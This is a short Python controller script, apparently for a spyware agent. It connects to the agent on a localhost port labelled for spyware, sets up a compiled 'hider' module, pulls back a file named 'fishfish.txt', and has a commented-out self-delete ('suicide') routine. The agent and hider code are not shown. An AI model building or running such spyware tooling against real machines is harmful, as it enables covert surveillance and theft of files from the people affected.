from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep

HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def clean():
    spyAgent = Agent(HOST, PORT_SPYWARE)
    spyAgent.suicide()


def main():

    targetHiderPath = "./sentHider.o"

    spyAgent = Agent(HOST, PORT_SPYWARE)

    print(spyAgent.hider_setup(targetHiderPath))
    print(spyAgent.retrieve_file("fishfish.txt"))


if __name__ == "__main__":
    main()
    # clean()
